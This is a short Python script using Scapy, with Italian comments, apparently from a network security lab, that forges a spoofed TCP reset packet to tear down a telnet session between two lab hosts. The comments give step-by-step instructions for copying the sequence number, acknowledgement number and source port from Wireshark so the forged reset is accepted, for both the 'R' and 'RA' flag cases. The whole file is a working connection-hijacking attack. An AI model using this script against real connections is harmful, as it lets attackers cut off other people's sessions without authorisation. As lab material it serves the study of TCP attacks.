#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.7", dst="10.9.0.6")
#tcp = TCP(sport=40850, dport=23, flags="RA", seq=549441071, ack=3220349551)
tcp = TCP(sport=40852, dport=23, flags="R", seq=2133784111)
data = "closing connection"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)



### CASO flag="RA"
### CLIENT = 10.9.0.7
### SERVER = 10.9.0.6
############# Modificare sport, seq e ack in modo manuale
#### Guardare l'ultimo pacchetto inviato dal client (wireshark)
#### 1. copiare nextseq number ---> seq=
#### 2. copiare ack --------------> ack=
#### 3. copiare source port ------> sport=
#################################################################
#### Connection closed by foreign host.


### CASO flag="R"
### CLIENT = 10.9.0.7
### SERVER = 10.9.0.6
############# Modificare sport e seq in modo manuale
#### Guardare l'ultimo pacchetto inviato dal client (wireshark)
#### 1. copiare nextseq number ---> seq=
#### 2. copiare source port ------> sport=
#################################################################
#### Connection closed by foreign host.
